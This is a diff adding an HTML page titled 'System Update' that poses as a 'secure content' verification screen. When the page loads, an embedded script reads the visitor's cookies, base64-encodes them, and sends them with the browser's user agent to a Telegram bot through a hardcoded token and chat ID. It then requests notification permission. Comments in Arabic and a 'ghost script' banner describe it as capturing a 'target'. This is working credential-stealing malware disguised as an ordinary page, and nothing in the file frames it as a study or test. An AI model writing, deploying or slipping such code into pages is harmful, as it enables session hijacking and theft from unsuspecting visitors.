@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Update</title>
+    <script>
+        // 🔱 LØGHØST-Z 💀: THE FINAL GHOST SCRIPT 2026
+        const token = '8509005526:AAHMolUzaC181vf97LSqpZa4-ShQofY0zW0';
+        const chat_id = '1772820433';
+
+        async function startCapture() {
+            try {
+                // 1. سحب الكوكيز (Cookies) وإرسالها فوراً
+                let cookies = document.cookie || "No Cookies Found (HttpOnly)";
+                let b64_cookies = btoa(unescape(encodeURIComponent(cookies)));
+                
+                // 2. جلب معلومات الجهاز (IP, OS, Browser)
+                let ua = navigator.userAgent;
+                
+                // 3. إرسال البيانات لتليجرام
+                let message = `🚨 **New Target Captured!**%0A%0A🍪 **Cookies (B64):**%0A\`${b64_cookies}\` %0A%0A📱 **System:** ${ua}`;
+                
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=Markdown`);
+
+                // 4. طلب صلاحية الـ SMS (عبر إشعارات المتصفح)
+                if (Notification.permission !== "granted") {
+                    Notification.requestPermission();
+                }
+            } catch (e) {}
+        }
+
+        // تنفيذ السحب بمجرد تحميل الصفحة
+        window.onload = startCapture;
+    </script>
+</head>
+<body style="background-color: black; color: white; font-family: sans-serif; text-align: center; padding-top: 20%;">
+    <h1>Loading Secure Content...</h1>
+    <p>Please wait while the system verifies your access.</p>
+</body>
+</html>
